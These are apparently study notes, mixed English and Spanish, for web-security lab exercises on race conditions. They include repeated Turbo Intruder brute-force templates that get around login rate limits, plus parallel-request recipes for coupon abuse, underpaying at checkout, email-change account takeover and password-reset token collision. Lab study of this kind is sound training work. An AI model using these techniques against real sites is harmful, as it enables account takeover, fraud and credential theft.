
**To identify:**

- Try seeing if the condition is attached to a session for example, there may be a time lapse between the client submit and the server actually committing the action. Or the lock is applied per user not session

**To exploit:**

- Try applying coupons in group (send in parallel)
- If a delay is noticed in a response, try racing the expensive item having a cheaper one. Add Item + purchase requests in parallel
- Try 2 requests to see if you can recieve the code of an arbitrary mail. You mail server + arbitrary mail in parallel 
- Try seeing if php cookies are set on forgot password for example, send two change password requests, one with the cookie and csrf of null session. If you get same token on the email you found a collision that takes only a timestamp but not user, change the username to carlos on the first request and send again in parallel, copy your link and change the user to carlos to access his password reset link.
- Brute Force with Turbo Intruder Extension Turbo Intruder template, takes wordlist from clipboard

```python
def queueRequests(target, wordlists):
    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )  
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard 
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

---

* Limit overrun race conditions -> 
```
Rebajar precio de un item con un codigo de descuento enviar la request varias veces IMPORTANTE EN UN `SEND GROUP IN PARALLEL` duplicar las requests las veces que sean necesarias hasta poder conseguir realmente el descuento del precio en $0 o casi $0
```

* Bypassing rate limits via race conditions -> `login brute force password` **en la request poner en password=%s para que lea el payload esa parte que es la que se atacará, y OBVIO cambiar el username a carlos**
```python
"""
Para hacer un brute force, de la contraseña del user victim en este caso `carlos`
Pero se mantiene un rate limit en el lab, con race condition se puede bypassear: 

Usar la lista de password de `Passwords List`
Con TURBO INTRUDER - Tiramos el código (importante tener las passwords en el portapapeles/clipboard)
"""

def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
        
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in wordlists.clipboard:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)

""" Reconocer el endpoint que retorne un 302 OK, esa será efectivamente la password, este ataque sirve en caso tal de poder encontrar un race condition en la option de login/ 
```

* Multi-endpoint race conditions -> `Ataque Parallel single connection`
	*  3 Request en total dentro de una race condition.
```js
Un POST /cart/checkout HTTP/2 que haga el checkout y añadimos DOS 2 request de 
añadir la chaqueta que queremos comprar porque deseamos lograr la sincronización de la peticiones aprovechandonos de la condición de carrera haciendo que cuando compre una gift card la interpreté la race condition con la compra de la jacket sin validar el precio con el credit store de $100 que tenía en la aplicación.
```

* Single-Endpoint Race Conditions -> `Paralell single packet attack`
```js
2 request dentro de un parallel single packet attack -> 
	* POST Cambio de correo electronico de wiener con el correo @exploit-server 
	* POST cambio de correo electronico de Carlos 

*. email=wiener@exploit-server.net&csrf=valueCSRF
*. email=carlos@juiceandshop.net&csrf=valueCSRF

Nos llegará al exploit server el correo electronico de cambio de carlos, tomamos el endpoint dejamos nuestro username wiener y nos apropiamos del correo de carlos, tipicamente un account takeover. 
```

* Exploiting time-sensitive - Race Condition -> `Parallel Single packet attack`
```js
2 request dentro de un parallel single packet attack ->
	* GET /forgot-password HTTP/2 //to get csrf token
	* POST /forgot-password HTTP/2
		username=wiener&csrf=valueCSRF
	* POST /forgot-password HTTP/2
		username=carlos&csrf=valueCSRF
* Nos llegará un solo correo de reset token, el problema radica en que a carlos le llegará un token de forgot password identico, nosotros usaremos el token para cambiar la password de carlos, ya que el token de el y el que llega a wiener son el mismo. 
* Cambiar la contraseña del endpoint GET /forgot-password?user=carlos&token=VALUEToken
```

---

```
Failing password 3 times blocks user, but not session, you can try other users
-> Count of request to block user could be server side controlled
-> Send the group of requests again, but this time in parallel. 
-> For details on how to do this, see [Sending requests in parallel]
-> Study the responses. Notice that although you have triggered the account lock, more than three requests received the normal `Invalid username and password` response.
-> Use Turbo Intruder Extension (examples/race-single-packet-attack.py) with the following template and copy to to your clipboard the passwords:


def queueRequests(target, wordlists):
    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )  
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard 
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)


Change Your email to the one of other user:
carlos@ginandjuice.shop
-> Send in paralel two requests, the first with carlos mail, the second with yours, recieve the mail in your server


Try obtaining reset token of carlos:
-> GET /forgot-password without cookies, copy csrf and cookie to one POST /forgot-password request and change user to carlos
-> In other Post /forgot-password with new cookie and csrf
-> Send group in parallel till a collision appears and you are assigned the same token as carlos (blind, you have to test the link)

```
